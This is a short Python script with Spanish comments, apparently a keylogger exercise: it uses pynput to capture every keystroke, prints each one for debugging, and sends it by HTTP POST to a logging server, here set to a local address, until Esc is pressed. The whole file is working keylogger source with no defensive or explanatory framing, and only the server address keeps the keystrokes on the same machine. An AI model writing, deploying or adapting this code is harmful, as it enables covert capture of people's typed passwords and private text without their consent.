from pynput import keyboard
import requests

SERVER_URL = "http://127.0.0.1:5000/log"

def on_press(key):
    try:
        data = str(key.char)
    except AttributeError:
        data = f"[{key}]"

    print("Tecla capturada:", data)  # 👈 Debug local

    try:
        r = requests.post(SERVER_URL, data={"key": data})
        print("Respuesta servidor:", r.status_code)
    except Exception as e:
        print("Error al enviar:", e)

def on_release(key):
    if key == keyboard.Key.esc:
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
